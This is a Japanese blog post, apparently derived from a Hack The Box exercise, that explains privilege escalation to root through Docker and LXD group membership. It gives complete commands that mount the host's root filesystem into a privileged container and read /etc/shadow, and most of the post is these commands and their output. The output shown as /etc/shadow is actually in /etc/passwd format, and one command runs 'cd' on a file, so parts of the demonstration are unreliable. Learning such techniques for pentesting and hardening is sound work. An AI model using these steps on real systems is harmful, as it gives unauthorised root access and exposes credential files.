---
layout:        post
title:         "Dockerを使った権限昇格"
date:          2021-05-23
category:      Security
cover:         /assets/cover1.jpg
redirect_from:
comments:      true
published:     true
latex:         false
photoswipe:    false
syntaxhighlight: true
# sitemap: false
# feed:    false
---

sudoを実行できないユーザでも、dockerグループに所属していれば、Dockerを使うことで権限昇格ができるようになります。

### Docker

Dockerを使ったやりかた：

```bash
docker run --privileged -v /:/mnt/root --rm -it debian
```

- `--priviledged` はコンテナ内のプロセスをルート権限で起動するためのオプションです。
- `-v <from>:<to>` はホストOSのディレクトリを、コンテナ内にマウントします。ホストOSのルートディレクトリをマウントすることで、ホストのファイルシステム全体にアクセスできるようになります。

上記のコマンドを実行すると、ルート権限でファイルシステム全体にアクセスできます。

実行結果：

```console
$ docker run --privileged -v /:/mnt/root --rm -it debian
root:/# id
uid=0(root) gid=0(root) groups=0(root)

root:/# cat /mnt/root/etc/shadow
root:x:0:0:root:/root:/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...省略...
```

### LXD

同様に、Linux上でコンテナを扱う LXD でも同じことができます。
sudoを実行できないユーザでも、lxdグループに所属していれば、LXDを使うことで権限昇格ができます。

LXDを使ったやりかた：

```bash
# alpineイメージのビルド
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
# 管理者権限付きで初期化
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias rootimage
lxc init rootimage ignite -c security.privileged=true
# ホストOSのルートディレクトリをコンテナにマウント
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
# コンテナの起動
lxc start ignite
lxc exec ignite /bin/sh
```

実行結果：

```console
~ # id
id
uid=0(root) gid=0(root)

~ # cd /mnt/root/etc/shadow
root:/# cat /mnt/root/etc/shadow
root:x:0:0:root:/root:/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...省略...
```

以上です。


### 参考文献

- [docker \| GTFOBins](https://gtfobins.github.io/gtfobins/docker/)
- Hack The Box - Included
